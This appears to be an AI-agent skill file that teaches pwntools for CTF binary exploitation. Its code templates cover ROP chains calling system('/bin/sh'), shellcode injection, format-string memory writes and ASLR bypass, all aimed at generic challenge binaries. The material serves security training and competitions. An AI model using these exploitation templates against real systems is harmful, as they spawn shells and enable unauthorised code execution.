---
name: pwntools
description: "Comprehensive guide for using pwntools in CTF and binary exploitation. Use when working with binary exploitation, ROP chains, shellcode generation, format strings, or any pwn challenges. Covers process communication, ELF analysis, assembly/disassembly, and advanced exploitation techniques."
license: MIT
---

# Pwntools: Binary Exploitation Framework

Pwntools is a CTF framework and exploit development library designed for rapid prototyping and development. This skill provides comprehensive guidance on using pwntools for binary exploitation, from basic process communication to advanced ROP chains and format string exploitation.

## Quick Start

```python
from pwn import *

# Configure context
context(arch='amd64', os='linux')

# Start process
p = process('./binary')

# Send and receive
p.sendline(b'input')
data = p.recv(1024)

# Interactive mode
p.interactive()
```

## Core Concepts

### 1. Context Configuration
Set global architecture, OS, and logging settings:
```python
context(arch='amd64', os='linux', log_level='debug')
```

### 2. Process Communication (Tubes)
Unified API for local processes, remote sockets, and SSH:
```python
p = process('./binary')           # Local process
r = remote('host', 1337)          # Remote socket
s = ssh(host='host', user='user') # SSH connection
```

### 3. Binary Analysis (ELF)
Parse and analyze ELF binaries:
```python
elf = ELF('./binary')
main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
```

### 4. Exploitation Primitives
- **ROP**: Return-Oriented Programming chains
- **Shellcode**: Generated with shellcraft
- **Format Strings**: Automated with FmtStr class
- **Packing**: Byte manipulation utilities

## Skill Modules

This skill includes detailed guides for:

1. **[Tubes Communication](./skills/tubes-communication.md)** - Process/socket/SSH interaction
2. **[ELF Binary Analysis](./skills/elf-binary-analysis.md)** - Binary parsing and symbols
3. **[Packing Utilities](./skills/packing-utilities.md)** - Byte packing/unpacking
4. **[Shellcraft](./skills/shellcraft-shellcode.md)** - Shellcode generation
5. **[Cyclic Patterns](./skills/cyclic-patterns.md)** - Offset finding
6. **[ROP Exploitation](./skills/rop-exploitation.md)** - ROP chain building
7. **[Format Strings](./skills/format-string-exploitation.md)** - Format string bugs
8. **[Context Configuration](./skills/context-configuration.md)** - Global settings
9. **[Assembly/Disassembly](./skills/asm-disasm.md)** - Code generation
10. **[GDB Debugging](./skills/gdb-debugging.md)** - Debugging integration
11. **[DynELF](./skills/dynelf-libc-resolution.md)** - Runtime symbol resolution

## Common Exploitation Patterns

### Buffer Overflow with ROP
```python
# 1. Find offset
pattern = cyclic(200)
offset = cyclic_find(crash_addr)

# 2. Build ROP chain
elf = ELF('./binary')
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])

# 3. Send payload
payload = b'A' * offset + rop.chain()
p.sendline(payload)
```

### Format String Exploitation
```python
# 1. Find offset (automated)
def exec_fmt(payload):
    p = process('./binary')
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

# 2. Write memory
payload = fmtstr_payload(offset, {target_addr: value})
p.sendline(payload)
```

### Shellcode Injection
```python
# 1. Generate shellcode
context(arch='amd64', os='linux')
shellcode = asm(shellcraft.sh())

# 2. Inject and execute
payload = b'A' * offset + shellcode
p.sendline(payload)
```

### Bypass ASLR
```python
# 1. Leak libc address
def leak(addr):
    p = process('./binary')
    # Use format string or other leak
    return leaked_bytes

# 2. Resolve symbols
d = DynELF(leak, elf=ELF('./binary'))
system_addr = d.lookup('system', 'libc')

# 3. Build exploit with resolved addresses
```

## Architecture Support

Pwntools supports multiple architectures:
- **x86**: amd64, i386
- **ARM**: arm, thumb, aarch64
- **MIPS**: mips, mips64
- **PowerPC**: ppc, ppc64
- **SPARC**: sparc, sparc64
- **RISC-V**: riscv64

## Debugging

### Attach GDB to Running Process
```python
p = process('./binary')
gdb.attach(p, 'break main')
p.interactive()
```

### Debug with Script
```python
gdb_script = '''
break vulnerable_function
continue
x/20x $rsp
'''
p = process('./binary')
gdb.attach(p, gdb_script)
```

## Best Practices

1. **Always set context first**: `context(arch='amd64', os='linux')`
2. **Use cyclic patterns for offset finding**: More reliable than manual counting
3. **Enable logging during development**: `context.log_level = 'debug'`
4. **Test locally before remote**: Verify exploit works on local binary
5. **Handle timeouts gracefully**: Set appropriate timeout values
6. **Use context managers**: `with process('./binary') as p:` for auto-cleanup
7. **Verify protections**: Use `elf.checksec()` to understand mitigations

## Common Issues

### "No gadgets found"
- Binary may be stripped or have few gadgets
- Try using libc ROP instead
- Use alternative exploitation technique

### Null bytes in shellcode
- Use `avoid=b'\x00'` parameter
- Use alternative instructions
- Encode shellcode after assembly

### ASLR defeats exploit
- Leak addresses first
- Use DynELF for automatic resolution
- Use information disclosure vulnerabilities

### Process exits unexpectedly
- Check timeout settings
- Verify payload format
- Use GDB to debug

## Resources

- **Official Docs**: https://docs.pwntools.com/
- **GitHub**: https://github.com/Gallopsled/pwntools
- **Tutorials**: https://github.com/Gallopsled/pwntools-tutorial
- **Write-ups**: https://github.com/Gallopsled/pwntools-write-ups
- **Discord**: https://discord.gg/96VA2zvjCB

## Examples

### Simple Buffer Overflow
```python
from pwn import *

context(arch='amd64', os='linux')
elf = ELF('./binary')

# Find offset
pattern = cyclic(200)
p = process('./binary')
p.sendline(pattern)
p.wait()

# Build payload
offset = cyclic_find(0x61616161)  # Adjust based on crash
payload = b'A' * offset + p64(elf.symbols['win'])

# Send exploit
p = process('./binary')
p.sendline(payload)
p.interactive()
```

### Format String Leak
```python
from pwn import *

context(arch='amd64', os='linux')

# Find offset
for i in range(20):
    p = process('./binary')
    p.sendline(b'%' + str(i).encode() + b'$p')
    output = p.recvline()
    print(f"Offset {i}: {output}")
    p.close()
```

### ROP Chain
```python
from pwn import *

context(arch='amd64', os='linux')
elf = ELF('./binary')

# Build ROP chain
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])

# Send payload
p = process('./binary')
payload = b'A' * 100 + rop.chain()
p.sendline(payload)
p.interactive()
```

## When to Use This Skill

Use this skill when:
- Working on binary exploitation challenges (CTF, pwn)
- Building ROP chains or shellcode
- Analyzing ELF binaries
- Exploiting format string vulnerabilities
- Bypassing protections (ASLR, DEP, canaries)
- Debugging exploitation code with GDB
- Generating payloads for buffer overflows
